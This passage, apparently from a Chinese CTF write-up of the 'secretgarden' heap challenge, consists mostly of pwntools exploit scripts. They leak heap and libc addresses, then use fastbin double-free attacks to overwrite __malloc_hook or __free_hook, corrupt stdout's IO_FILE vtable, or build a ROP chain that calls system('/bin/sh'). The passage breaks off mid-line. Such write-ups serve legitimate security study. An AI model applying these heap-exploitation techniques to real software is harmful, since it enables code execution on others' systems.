sh.sendlineafter(<span class="string">':'</span>,str(flower_id))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_flower</span><span class="params">()</span>:</span></span><br><span class="line">	sh.sendlineafter(<span class="string">':'</span>,<span class="string">'4'</span>)</span><br><span class="line"><span class="comment">#context.log_level='debug'</span></span><br><span class="line">sh=process(<span class="string">'./secretgarden'</span>)</span><br><span class="line">add(<span class="number">0x98</span>,<span class="string">'a'</span>*<span class="number">8</span>,<span class="string">'color'</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x98</span>,<span class="string">'a'</span>*<span class="number">8</span>,<span class="string">'color'</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'a'</span>*<span class="number">8</span>,<span class="string">'color'</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'a'</span>*<span class="number">8</span>,<span class="string">'color'</span>) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'a'</span>*<span class="number">8</span>,<span class="string">'color'</span>) <span class="comment">#4</span></span><br><span class="line">delete_name(<span class="number">0</span>)</span><br><span class="line">delete_name(<span class="number">1</span>)</span><br><span class="line">delete_flower()</span><br><span class="line"><span class="comment">#---------leak heap base-------------------</span></span><br><span class="line">add(<span class="number">0x98</span>,<span class="string">'c'</span>*<span class="number">8</span>,<span class="string">'color1'</span>) <span class="comment">#0</span></span><br><span class="line">show()</span><br><span class="line">sh.recvuntil(<span class="string">'cccccccc'</span>)</span><br><span class="line">heap_a1=u64(sh.recvuntil(<span class="string">'C'</span>)[:<span class="number">-2</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">heap_base=heap_a1<span class="number">-0x1110</span></span><br><span class="line"><span class="keyword">print</span> hex(heap_base)</span><br><span class="line"><span class="comment">#---------leak libc base-------------------</span></span><br><span class="line">add(<span class="number">0x98</span>,<span class="string">'1234abcd'</span>,<span class="string">'color1'</span>) <span class="comment">#1</span></span><br><span class="line">show()</span><br><span class="line">sh.recvuntil(<span class="string">'abcd'</span>)</span><br><span class="line">unsortbin_addr=u64(sh.recvuntil(<span class="string">'C'</span>)[:<span class="number">-2</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">main_arena=unsortbin_addr<span class="number">-0x58</span></span><br><span class="line"><span class="comment">#main_arena_offset=0x7ffff7dd1b20-0x7ffff7a0d000</span></span><br><span class="line">main_arena_offset=<span class="number">0x3c4b20</span></span><br><span class="line">libc_base=main_arena-main_arena_offset</span><br><span class="line"><span class="keyword">print</span> hex(main_arena)</span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line">onegadet_offset=<span class="number">0xf02a4</span></span><br><span class="line">onegadet=libc_base+onegadet_offset</span><br><span class="line"><span class="comment">#----------fastbin attack------------------</span></span><br><span class="line">delete_name(<span class="number">2</span>)</span><br><span class="line">delete_name(<span class="number">3</span>)</span><br><span class="line">delete_name(<span class="number">2</span>)</span><br><span class="line">delete_flower()</span><br><span class="line">add(<span class="number">0x68</span>,p64(main_arena<span class="number">-0x33</span>),<span class="string">'color'</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'a'</span>*<span class="number">8</span>,<span class="string">'color'</span>)</span><br><span class="line">add(<span class="number">0x68</span>,p64(main_arena),<span class="string">'color'</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'a'</span>*<span class="number">0x13</span>+p64(onegadet),<span class="string">'color'</span>)</span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">delete_name(<span class="number">0</span>)</span><br><span class="line">delete_name(<span class="number">0</span>)</span><br><span class="line">delete_name(<span class="number">0</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h4 id="利用-free-hook"><a href="#利用-free-hook" class="headerlink" title="利用_free_hook"></a>利用_free_hook</h4><p>利用<code>free_hook</code>的关键点在于<code>free_hook</code>上方很大一块空间都是0，此处的方法是修改<code>topchunk</code>指向<code>free_hook</code>上方的空间，需要注意的一点是尽量用0填充空间，如果填充错了可能会导致程序出错。另一点是要做好计算。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(namelength,name,color)</span>:</span></span><br><span class="line">	sh.sendlineafter(<span class="string">'choice :'</span>,<span class="string">'1'</span>)</span><br><span class="line">	sh.sendlineafter(<span class="string">'name :'</span>,str(namelength))</span><br><span class="line">	sh.sendafter(<span class="string">'flower :'</span>,name)</span><br><span class="line">	sh.sendlineafter(<span class="string">'flower :'</span>,color)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">	sh.sendlineafter(<span class="string">'choice :'</span>,<span class="string">'2'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_name</span><span class="params">(flower_id)</span>:</span></span><br><span class="line">	sh.sendlineafter(<span class="string">'choice :'</span>,<span class="string">'3'</span>)</span><br><span class="line">	sh.sendlineafter(<span class="string">'garden:'</span>,str(flower_id))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_flower</span><span class="params">()</span>:</span></span><br><span class="line">	sh.sendlineafter(<span class="string">'choice :'</span>,<span class="string">'4'</span>)</span><br><span class="line"><span class="comment">#context.log_level='debug'</span></span><br><span class="line">sh=process(<span class="string">'./secretgarden'</span>)</span><br><span class="line">add(<span class="number">0x98</span>,<span class="string">'\x00'</span>*<span class="number">8</span>,<span class="string">'color'</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x98</span>,<span class="string">'\x00'</span>*<span class="number">8</span>,<span class="string">'color'</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'\x00'</span>*<span class="number">8</span>,<span class="string">'color'</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'\x00'</span>*<span class="number">8</span>,<span class="string">'color'</span>) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'/bin/sh\x00'</span>,<span class="string">'color'</span>) <span class="comment">#4</span></span><br><span class="line">delete_name(<span class="number">0</span>)          </span><br><span class="line">delete_name(<span class="number">1</span>)        </span><br><span class="line">delete_flower()          <span class="comment">#    234</span></span><br><span class="line"><span class="comment">#---------leak heap base-------------------</span></span><br><span class="line">add(<span class="number">0x98</span>,<span class="string">'c'</span>*<span class="number">8</span>,<span class="string">'color1'</span>) <span class="comment">#0</span></span><br><span class="line">show()</span><br><span class="line">sh.recvuntil(<span class="string">'cccccccc'</span>)</span><br><span class="line">heap_a1=u64(sh.recvuntil(<span class="string">'C'</span>)[:<span class="number">-2</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">heap_base=heap_a1<span class="number">-0x1110</span></span><br><span class="line"><span class="keyword">print</span> hex(heap_base)</span><br><span class="line"><span class="comment">#---------leak libc base-------------------</span></span><br><span class="line">add(<span class="number">0x98</span>,<span class="string">'1234abcd'</span>,<span class="string">'color1'</span>) <span class="comment">#1</span></span><br><span class="line">show()</span><br><span class="line">sh.recvuntil(<span class="string">'abcd'</span>)</span><br><span class="line">unsortbin_addr=u64(sh.recvuntil(<span class="string">'C'</span>)[:<span class="number">-2</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">main_arena=unsortbin_addr<span class="number">-0x58</span></span><br><span class="line"><span class="comment">#main_arena_offset=0x7ffff7dd1b20-0x7ffff7a0d000</span></span><br><span class="line">main_arena_offset=<span class="number">0x3c4b20</span></span><br><span class="line">libc_base=main_arena-main_arena_offset</span><br><span class="line"><span class="keyword">print</span> hex(main_arena)</span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line"><span class="comment">#system_offset=0x7ffff7a52390-0x7ffff7a0d000=0x45390</span></span><br><span class="line">system_offset=<span class="number">0x45390</span></span><br><span class="line">system=libc_base+system_offset</span><br><span class="line"><span class="comment">#free_hook_offset=0x7ffff7dd37a8-0x7ffff7a0d000=0x3c67a8</span></span><br><span class="line">free_hook_offset=<span class="number">0x3c67a8</span></span><br><span class="line">free_hook=libc_base+free_hook_offset</span><br><span class="line"><span class="keyword">print</span> <span class="string">'free_hook:\t'</span>+hex(free_hook)</span><br><span class="line"><span class="comment">#----------fastbin attack------------------</span></span><br><span class="line">delete_name(<span class="number">2</span>)</span><br><span class="line">delete_name(<span class="number">3</span>)</span><br><span class="line">delete_name(<span class="number">2</span>)</span><br><span class="line">delete_flower()         <span class="comment">#014</span></span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line"><span class="comment">#------change top chunk point to free_hook-0xb58</span></span><br><span class="line">add(<span class="number">0x68</span>,p64(main_arena<span class="number">-0x33</span>),<span class="string">'color'</span>)  <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'\x00'</span>*<span class="number">8</span>,<span class="string">'color'</span>)     <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x68</span>,p64(main_arena),<span class="string">'color'</span>)  </span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'\x00'</span>*<span class="number">0x13</span>+<span class="string">'\x00'</span>*<span class="number">0x38</span>+p64(main_arena+<span class="number">0x30</span>)+<span class="string">'\x00'</span>*<span class="number">8</span>+p64(<span class="number">0x61</span>),<span class="string">'color'</span>)</span><br><span class="line">add(<span class="number">0x58</span>,<span class="string">'\x00'</span>*<span class="number">0x18</span>+p64(free_hook<span class="number">-0xb58</span>),<span class="string">'color'</span>)</span><br><span class="line"><span class="comment">#----malloc until free_hook</span></span><br><span class="line">add(<span class="number">0x1f8</span>,<span class="string">'\x00'</span>*<span class="number">8</span>,<span class="string">'color'</span>)   <span class="comment">#0xb58-0x200=0x958</span></span><br><span class="line">add(<span class="number">0x1f8</span>,<span class="string">'\x00'</span>*<span class="number">8</span>,<span class="string">'color'</span>)   <span class="comment">#0x758</span></span><br><span class="line">add(<span class="number">0x1f8</span>,<span class="string">'\x00'</span>*<span class="number">8</span>,<span class="string">'color'</span>)   <span class="comment">#0x558</span></span><br><span class="line">add(<span class="number">0x1f8</span>,<span class="string">'\x00'</span>*<span class="number">8</span>,<span class="string">'color'</span>)   <span class="comment">#0x358</span></span><br><span class="line">add(<span class="number">0x1f8</span>,<span class="string">'\x00'</span>*<span class="number">8</span>,<span class="string">'color'</span>)   <span class="comment">#0x158</span></span><br><span class="line">add(<span class="number">0x1f8</span>,<span class="string">'\x00'</span>*<span class="number">0x28</span>+p64(system),<span class="string">'color'</span>)</span><br><span class="line">delete_name(<span class="number">4</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h4 id="利用IO-FILE"><a href="#利用IO-FILE" class="headerlink" title="利用IO_FILE"></a>利用IO_FILE</h4><p>主要是利用<code>fastbinattack</code>修改<code>_IO_2_1_stdout_</code>的虚表指针，将它的puts函数修改为<code>onegadet</code>的地址，此处使用了空间上的复用，尽量维持原来结构体不要变化。？</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(namelength,name,color)</span>:</span></span><br><span class="line">	sh.sendlineafter(<span class="string">'choice :'</span>,<span class="string">'1'</span>)</span><br><span class="line">	sh.sendlineafter(<span class="string">'name :'</span>,str(namelength))</span><br><span class="line">	sh.sendafter(<span class="string">'flower :'</span>,name)</span><br><span class="line">	sh.sendlineafter(<span class="string">'flower :'</span>,color)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">	sh.sendlineafter(<span class="string">'choice :'</span>,<span class="string">'2'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_name</span><span class="params">(flower_id)</span>:</span></span><br><span class="line">	sh.sendlineafter(<span class="string">'choice :'</span>,<span class="string">'3'</span>)</span><br><span class="line">	sh.sendlineafter(<span class="string">'garden:'</span>,str(flower_id))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_flower</span><span class="params">()</span>:</span></span><br><span class="line">	sh.sendlineafter(<span class="string">'choice :'</span>,<span class="string">'4'</span>)</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"><span class="comment">#context.log_level='debug'</span></span><br><span class="line">sh=process(<span class="string">'./secretgarden'</span>)</span><br><span class="line">add(<span class="number">0x98</span>,<span class="string">'\x00'</span>*<span class="number">8</span>,<span class="string">'color'</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x98</span>,<span class="string">'\x00'</span>*<span class="number">8</span>,<span class="string">'color'</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'\x00'</span>*<span class="number">8</span>,<span class="string">'color'</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'\x00'</span>*<span class="number">8</span>,<span class="string">'color'</span>) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'/bin/sh\x00'</span>,<span class="string">'color'</span>) <span class="comment">#4</span></span><br><span class="line">delete_name(<span class="number">0</span>)          </span><br><span class="line">delete_name(<span class="number">1</span>)        </span><br><span class="line">delete_flower()          <span class="comment">#    234</span></span><br><span class="line"><span class="comment">#---------leak heap base-------------------</span></span><br><span class="line">add(<span class="number">0x98</span>,<span class="string">'c'</span>*<span class="number">8</span>,<span class="string">'color1'</span>) <span class="comment">#0</span></span><br><span class="line">show()</span><br><span class="line">sh.recvuntil(<span class="string">'cccccccc'</span>)</span><br><span class="line">heap_a1=u64(sh.recvuntil(<span class="string">'C'</span>)[:<span class="number">-2</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">heap_base=heap_a1<span class="number">-0x1110</span></span><br><span class="line"><span class="keyword">print</span> hex(heap_base)</span><br><span class="line"><span class="comment">#---------leak libc base-------------------</span></span><br><span class="line">add(<span class="number">0x98</span>,<span class="string">'1234abcd'</span>,<span class="string">'color1'</span>) <span class="comment">#1</span></span><br><span class="line">show()</span><br><span class="line">sh.recvuntil(<span class="string">'abcd'</span>)</span><br><span class="line">unsortbin_addr=u64(sh.recvuntil(<span class="string">'C'</span>)[:<span class="number">-2</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">main_arena=unsortbin_addr<span class="number">-0x58</span></span><br><span class="line">main_arena_offset=<span class="number">0x3c4b20</span></span><br><span class="line">libc_base=main_arena-main_arena_offset</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#stdout_offset=0x7ffff7dd2620-0x00007ffff7a0d000=0x3c5620</span></span><br><span class="line">stdout_offset=<span class="number">0x3c5620</span></span><br><span class="line">stdout=libc_base+stdout_offset</span><br><span class="line"></span><br><span class="line">onegadet_offset=<span class="number">0x4526a</span></span><br><span class="line">onegadet=libc_base+onegadet_offset</span><br><span class="line"><span class="keyword">print</span> hex(main_arena)</span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'onegadet:\t'</span>+hex(onegadet)</span><br><span class="line"><span class="comment">#----------fastbin attack------------------</span></span><br><span class="line">delete_name(<span class="number">2</span>)</span><br><span class="line">delete_name(<span class="number">3</span>)</span><br><span class="line">delete_name(<span class="number">2</span>)</span><br><span class="line">delete_flower()         <span class="comment"># #014 not too much small chunk</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#------change top chunk point to free_hook-0xb58</span></span><br><span class="line">add(<span class="number">0x68</span>,p64(stdout+<span class="number">0xa0</span><span class="number">-0x3</span>),<span class="string">'color'</span>)  <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'\x00'</span>*<span class="number">8</span>,<span class="string">'color'</span>)     <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x68</span>,p64(main_arena),<span class="string">'color'</span>) </span><br><span class="line">payload=<span class="string">'\x00'</span>*<span class="number">0x3</span>+p64(onegadet)+<span class="string">'\x00'</span>*<span class="number">0x8</span>+<span class="string">'\xff'</span>*<span class="number">4</span>+<span class="string">'\x00'</span>*<span class="number">4</span>+<span class="string">'\x00'</span>*<span class="number">0x10</span>+p64(stdout+<span class="number">0x78</span>) </span><br><span class="line"><span class="comment">#add(0x68,payload,'color')</span></span><br><span class="line">sh.sendlineafter(<span class="string">'choice :'</span>,<span class="string">'1'</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">'name :'</span>,str(<span class="number">0x68</span>))</span><br><span class="line"><span class="comment">#</span></span><br><span class="line">sh.sendafter(<span class="string">'flower :'</span>,payload)</span><br><span class="line">gdb.attach(sh)</span><br><span class="line"></span><br><span class="line"><span class="comment">#----malloc until free_hook</span></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h4 id="利用-ROP"><a href="#利用-ROP" class="headerlink" title="利用 ROP"></a>利用 ROP</h4><ol>
<li>想要利用栈，就必须定位栈地址,可以通过<code>libc</code>上的<code>environ</code>来泄露栈地址。</li>
<li>通过gdb调试可以定位到函数返回地址，原计划修改raise_a_flower的返回地址，但是<code>malloc</code>无法分配空间到其上方，后改为修改<code>raise_a_flower</code>中调用read函数的返回地址。原因是：1、<code>malloc</code>函数刚好可以分配到read函数返回地址上方。2 其实raise_a_flower 中调用函数都会新分配一个栈空间，调用的函数返回地址都是一个位置，只用在malloc函数分配完栈上的chunk之后，才能修改，刚好read函数会向chunk里写数据，刚好可以覆盖其自己的地址。</li>
<li>利用libc来构造rop链，因为程序开启了pie，所以可以利用libc_base确定代码位置，这样在动态环境中可用</li>
<li>其实可以用fastbin_attack泄露canary的地址，与泄露栈地址方法一样。需要先通过gdb调试确定canary的位置</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(namelength,name,color)</span>:</span></span><br><span class="line">	sh.sendlineafter(<span class="string">'choice :'</span>,<span class="string">'1'</span>)</span><br><span class="line">	sh.sendlineafter(<span class="string">'name :'</span>,str(namelength))</span><br><span class="line">	sh.sendafter(<span class="string">'flower :'</span>,name)</span><br><span class="line">	sh.sendlineafter(<span class="string">'flower :'</span>,color)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">	sh.sendlineafter(<span class="string">'choice :'</span>,<span class="string">'2'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_name</span><span class="params">(flower_id)</span>:</span></span><br><span class="line">	sh.sendlineafter(<span class="string">'choice :'</span>,<span class="string">'3'</span>)</span><br><span class="line">	sh.sendlineafter(<span class="string">'garden:'</span>,str(flower_id))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_flower</span><span class="params">()</span>:</span></span><br><span class="line">	sh.sendlineafter(<span class="string">'choice :'</span>,<span class="string">'4'</span>) </span><br><span class="line"><span class="comment">#context.log_level='debug'</span></span><br><span class="line">sh=process(<span class="string">'./secretgarden'</span>)</span><br><span class="line">add(<span class="number">0x98</span>,<span class="string">'\x00'</span>*<span class="number">8</span>,<span class="string">'color'</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x98</span>,<span class="string">'\x00'</span>*<span class="number">8</span>,<span class="string">'color'</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x28</span>,<span class="string">'\x00'</span>*<span class="number">8</span>,<span class="string">'color'</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x28</span>,<span class="string">'\x00'</span>*<span class="number">8</span>,<span class="string">'color'</span>) <span class="comment">#3</span></span><br><span class="line">delete_name(<span class="number">0</span>)          </span><br><span class="line">delete_name(<span class="number">1</span>)        </span><br><span class="line">delete_flower()          <span class="comment">#    234</span></span><br><span class="line"><span class="comment">#---------leak heap base-------------------</span></span><br><span class="line">add(<span class="number">0x98</span>,<span class="string">'c'</span>*<span class="number">8</span>,<span class="string">'color1'</span>) <span class="comment">#0</span></span><br><span class="line">show()</span><br><span class="line">sh.recvuntil(<span class="string">'cccccccc'</span>)</span><br><span class="line">heap_a1=u64(sh.recvuntil(<span class="string">'C'</span>)[:<span class="number">-2</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">heap_base=heap_a1<span class="number">-0x1110</span></span><br><span class="line"><span class="keyword">print</span> hex(heap_base)</span><br><span class="line"><span class="comment">#---------leak libc base-------------------</span></span><br><span class="line">add(<span class="number">0x98</span>,<span class="string">'1234abcd'</span>,<span class="string">'color1'</span>) <span class="comment">#1</span></span><br><span class="line">show()</span><br><span class="line">sh.recvuntil(<span class="string">'abcd'</span>)</span><br><span class="line">unsortbin_addr=u64(sh.recvuntil(<span class="string">'C'</span>)[:<span class="number">-2</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">main_arena=unsortbin_addr<span class="number">-0x58</span></span><br><span class="line">main_arena_offset=<span class="number">0x3c4b20</span></span><br><span class="line">libc_base=main_arena-main_arena_offset</span><br><span class="line">environ_offset=<span class="number">0x3c6f38</span></span><br><span class="line">environ=libc_base+environ_offset</span><br><span class="line"><span class="keyword">print</span> hex(main_arena)</span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'environ:\t'</span>+hex(environ)</span><br><span class="line"><span class="comment">#----------fastbin attack &amp;&amp; leak stack address------------------</span></span><br><span class="line">delete_name(<span class="number">2</span>)</span><br><span class="line">delete_name(<span class="number">3</span>)</span><br><span class="line">delete_name(<span class="number">2</span>)	</span><br><span class="line">add(<span class="number">0x38</span>,<span class="string">'\x00'</span>*<span class="number">8</span>,<span class="string">'color'</span>)  <span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x28</span>,p64(<span class="number">0x1</span>)+p64(environ),<span class="string">'color'</span>)  <span class="comment">#5</span></span><br><span class="line">show()</span><br><span class="line">sh.recvuntil(<span class="string">'4] :'</span>)</span><br><span class="line">stack=u64(sh.recvuntil(<span class="string">'C'</span>)[:<span class="number">-2</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="comment">#------change top chunk point to free_hook-0xb58</span></span><br><span class="line">delete_name(<span class="number">5</span>)</span><br><span class="line">delete_flower()</span><br><span class="line">add(<span class="number">0x28</span>,<span class="string">'\x00'</span>*<span class="number">0x10</span>,<span class="string">'color'</span>)</span><br><span class="line">add(<span class="number">0x28</span>,<span class="string">'\x00'</span>*<span class="number">0x10</span>,<span class="string">'color'</span>)</span><br><span class="line">delete_flower()</span><br><span class="line">delete_name(<span class="number">2</span>)</span><br><span class="line">delete_name(<span class="number">3</span>)</span><br><span class="line">delete_flower()</span><br><span class="line">system_offset=<span class="number">0x45390</span></span><br><span class="line">system=libc_base+system_offset</span><br><span class="line">binsh_offset=<span class="number">0x18cd57</span></span><br><span class="line">binsh=libc_base+binsh_offset</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'a'</span>*<span class="number">8</span>,<span class="string">'color'</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'a'</span>*<span class="number">8</span>,<span class="string">'color'</span>) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'a'</span>*<span class="number">8</span>,<span class="string">'color'</span>) <span class="comment">#4</span></span><br><span class="line">delete_name(<span class="number">2</span>)</span><br><span class="line">delete_name(<span class="number">3</span>)</span><br><span class="line">delete_name(<span class="number">2</span>)</span><br><span class="line">delete_flower()</span><br><span class="line">add(<span class="number">0x68</span>,p64(stack<span class="number">-0x18b</span>),<span class="string">'color'</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'a'</span>*<span class="number">8</span>,<span class="string">'color'</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'a'</span>*<span class="number">8</span>,<span class="string">'color'</span>)</span><br><span class="line">pop_rdi_ret=libc_base+<span class="number">0x21102</span></span><br><span class="line">payload=<span class="string">'\x00'</span>*<span class="number">3</span>+<span class="string">'a'</span>*<span class="number">0x28</span>+p64(pop_rdi_ret)+p64(binsh)+p64(system)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"stack\t"</span>+hex(stack<span 